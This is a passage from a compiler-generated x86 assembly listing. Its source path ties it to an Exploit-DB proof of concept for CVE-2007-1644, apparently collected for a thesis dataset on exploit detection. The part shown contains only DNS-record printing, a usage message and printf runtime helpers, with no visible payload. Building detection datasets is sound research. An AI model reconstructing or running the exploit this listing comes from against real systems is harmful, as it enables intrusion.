	mov	edx, DWORD PTR [ecx+36]
	push	edx
	mov	eax, DWORD PTR _result$[ebp]
	mov	ecx, DWORD PTR [eax+32]
	push	ecx
	push	OFFSET $SG100657
	call	_printf
	add	esp, 24					; 00000018H
; Line 138
	jmp	$LN5@DnsQueryA
$LN15@DnsQueryA:
; Line 141
	mov	edx, DWORD PTR _result$[ebp]
	movzx	eax, WORD PTR [edx+28]
	push	eax
	mov	ecx, DWORD PTR _result$[ebp]
	mov	edx, DWORD PTR [ecx+24]
	push	edx
	mov	eax, DWORD PTR _result$[ebp]
	mov	ecx, DWORD PTR [eax+4]
	push	ecx
	push	OFFSET $SG100659
	call	_printf
	add	esp, 16					; 00000010H
; Line 142
	jmp	SHORT $LN5@DnsQueryA
$LN16@DnsQueryA:
; Line 145
	mov	edx, DWORD PTR _result$[ebp]
	mov	eax, DWORD PTR [edx+24]
	push	eax
	push	OFFSET $SG100661
	call	_printf
	add	esp, 8
; Line 146
	jmp	SHORT $LN5@DnsQueryA
$LN17@DnsQueryA:
; Line 149
	mov	ecx, DWORD PTR _result$[ebp]
	mov	edx, DWORD PTR [ecx+24]
	push	edx
	push	OFFSET $SG100663
	call	_printf
	add	esp, 8
; Line 150
	mov	eax, DWORD PTR _result$[ebp]
	movzx	ecx, WORD PTR [eax+30]
	push	ecx
	mov	edx, DWORD PTR _result$[ebp]
	movzx	eax, WORD PTR [edx+32]
	push	eax
	mov	ecx, DWORD PTR _result$[ebp]
	movzx	edx, WORD PTR [ecx+28]
	push	edx
	push	OFFSET $SG100664
	call	_printf
	add	esp, 16					; 00000010H
; Line 152
	jmp	SHORT $LN5@DnsQueryA
$LN18@DnsQueryA:
; Line 155
	mov	eax, DWORD PTR _result$[ebp]
	movzx	ecx, WORD PTR [eax+8]
	push	ecx
	push	OFFSET $SG100666
	call	_printf
	add	esp, 8
$LN5@DnsQueryA:
; Line 158
	mov	edx, DWORD PTR _result$[ebp]
	mov	eax, DWORD PTR [edx]
	mov	DWORD PTR _result$[ebp], eax
; Line 159
	cmp	DWORD PTR _result$[ebp], 0
	jne	$LN4@DnsQueryA
; Line 160
	jmp	SHORT $LN8@DnsQueryA
$LN9@DnsQueryA:
; Line 161
	cmp	DWORD PTR _status$[ebp], 9003		; 0000232bH
	jne	SHORT $LN19@DnsQueryA
	push	OFFSET $SG100669
	call	_printf
	add	esp, 4
	jmp	SHORT $LN20@DnsQueryA
$LN19@DnsQueryA:
; Line 162
	call	DWORD PTR __imp__GetLastError@0
	push	eax
	mov	ecx, DWORD PTR _status$[ebp]
	push	ecx
	push	OFFSET $SG100670
	call	_printf
	add	esp, 12					; 0000000cH
$LN20@DnsQueryA:
; Line 163
	push	-1
	call	_exit
$LN8@DnsQueryA:
; Line 166
	mov	eax, DWORD PTR _records$[ebp]
$LN21@DnsQueryA:
; Line 167
	mov	esp, ebp
	pop	ebp
	ret	0
$LN23@DnsQueryA:
	DD	$LN11@DnsQueryA
	DD	$LN12@DnsQueryA
	DD	$LN13@DnsQueryA
	DD	$LN14@DnsQueryA
	DD	$LN15@DnsQueryA
	DD	$LN16@DnsQueryA
	DD	$LN17@DnsQueryA
	DD	$LN18@DnsQueryA
$LN22@DnsQueryA:
	DB	0
	DB	1
	DB	7
	DB	7
	DB	2
	DB	3
	DB	7
	DB	7
	DB	7
	DB	7
	DB	7
	DB	7
	DB	7
	DB	7
	DB	4
	DB	5
	DB	7
	DB	7
	DB	7
	DB	7
	DB	7
	DB	7
	DB	7
	DB	7
	DB	7
	DB	7
	DB	7
	DB	7
	DB	7
	DB	7
	DB	7
	DB	7
	DB	6
_DnsQueryA ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_argv$ = 8						; size = 4
_usage	PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_3544_cve_id_CVE-2007-1644.c
; Line 352
	push	ebp
	mov	ebp, esp
; Line 353
	push	OFFSET $SG100785
	call	_printf
	add	esp, 4
; Line 354
	mov	eax, 4
	imul	ecx, eax, 0
	mov	edx, DWORD PTR _argv$[ebp]
	mov	eax, DWORD PTR [edx+ecx]
	push	eax
	push	OFFSET $SG100786
	call	_printf
	add	esp, 8
; Line 355
	push	OFFSET $SG100787
	call	_printf
	add	esp, 4
; Line 356
	mov	ecx, 4
	imul	edx, ecx, 0
	mov	eax, DWORD PTR _argv$[ebp]
	mov	ecx, DWORD PTR [eax+edx]
	push	ecx
	push	OFFSET $SG100788
	call	_printf
	add	esp, 8
; Line 357
	mov	edx, 4
	imul	eax, edx, 0
	mov	ecx, DWORD PTR _argv$[ebp]
	mov	edx, DWORD PTR [ecx+eax]
	push	edx
	push	OFFSET $SG100789
	call	_printf
	add	esp, 8
; Line 358
	mov	eax, 4
	imul	ecx, eax, 0
	mov	edx, DWORD PTR _argv$[ebp]
	mov	eax, DWORD PTR [edx+ecx]
	push	eax
	push	OFFSET $SG100790
	call	_printf
	add	esp, 8
; Line 359
	mov	ecx, 4
	imul	edx, ecx, 0
	mov	eax, DWORD PTR _argv$[ebp]
	mov	ecx, DWORD PTR [eax+edx]
	push	ecx
	push	OFFSET $SG100791
	call	_printf
	add	esp, 8
; Line 360
	mov	edx, 4
	imul	eax, edx, 0
	mov	ecx, DWORD PTR _argv$[ebp]
	mov	edx, DWORD PTR [ecx+eax]
	push	edx
	push	OFFSET $SG100792
	call	_printf
	add	esp, 8
; Line 361
	push	OFFSET $SG100793
	call	_printf
	add	esp, 4
; Line 362
	mov	eax, 4
	imul	ecx, eax, 0
	mov	edx, DWORD PTR _argv$[ebp]
	mov	eax, DWORD PTR [edx+ecx]
	push	eax
	push	OFFSET $SG100794
	call	_printf
	add	esp, 8
; Line 363
	mov	ecx, 4
	imul	edx, ecx, 0
	mov	eax, DWORD PTR _argv$[ebp]
	mov	ecx, DWORD PTR [eax+edx]
	push	ecx
	push	OFFSET $SG100795
	call	_printf
	add	esp, 8
; Line 364
	mov	edx, 4
	imul	eax, edx, 0
	mov	ecx, DWORD PTR _argv$[ebp]
	mov	edx, DWORD PTR [ecx+eax]
	push	edx
	push	OFFSET $SG100796
	call	_printf
	add	esp, 8
; Line 365
	mov	eax, 4
	imul	ecx, eax, 0
	mov	edx, DWORD PTR _argv$[ebp]
	mov	eax, DWORD PTR [edx+ecx]
	push	eax
	push	OFFSET $SG100797
	call	_printf
	add	esp, 8
; Line 366
	mov	ecx, 4
	imul	edx, ecx, 0
	mov	eax, DWORD PTR _argv$[ebp]
	mov	ecx, DWORD PTR [eax+edx]
	push	ecx
	push	OFFSET $SG100798
	call	_printf
	add	esp, 8
; Line 367
	push	0
	call	_exit
$LN2@usage:
; Line 368
	pop	ebp
	ret	0
_usage	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT _printf
_TEXT	SEGMENT
__Result$ = -8						; size = 4
__ArgList$ = -4						; size = 4
__Format$ = 8						; size = 4
_printf	PROC						; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 956
	push	ebp
	mov	ebp, esp
	sub	esp, 8
; Line 959
	lea	eax, DWORD PTR __Format$[ebp+4]
	mov	DWORD PTR __ArgList$[ebp], eax
; Line 960
	mov	ecx, DWORD PTR __ArgList$[ebp]
	push	ecx
	push	0
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	push	1
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	__vfprintf_l
	add	esp, 16					; 00000010H
	mov	DWORD PTR __Result$[ebp], eax
; Line 961
	mov	DWORD PTR __ArgList$[ebp], 0
; Line 962
	mov	eax, DWORD PTR __Result$[ebp]
; Line 963
	mov	esp, ebp
	pop	ebp
	ret	0
_printf	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT __vfprintf_l
_TEXT	SEGMENT
__Stream$ = 8						; size = 4
__Format$ = 12						; size = 4
__Locale$ = 16						; size = 4
__ArgList$ = 20						; size = 4
__vfprintf_l PROC					; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 644
	push	ebp
	mov	ebp, esp
; Line 645
	mov	eax, DWORD PTR __ArgList$[ebp]
	push	eax
	mov	ecx, DWORD PTR __Locale$[ebp]
	push	ecx
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	mov	eax, DWORD PTR __Stream$[ebp]
	push	eax
	call	___local_stdio_printf_options
	mov	ecx, DWORD PTR [eax+4]
	push	ecx
	mov	edx, DWORD PTR [eax]
	push	edx
	call	___stdio_common_vfprintf
	add	esp, 24					; 00000018H
; Line 646
	pop	ebp
	ret	0
__vfprintf_l ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ___local_stdio_printf_options
_TEXT	SEGMENT
___local_stdio_printf_options PROC			; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\corecrt_stdio_config.h
; Line 90
	push	ebp
	mov	ebp, esp
; Line 92
	mov	eax, OFFSET ?_OptionsStorage@?1??__local_stdio_printf_options@@9@9 ; `__local_stdio_printf_options'::`2'::_OptionsStorage
; Line 93
	pop	ebp
	ret	0
___local_stdio_printf_options ENDP
_TEXT	ENDS
END
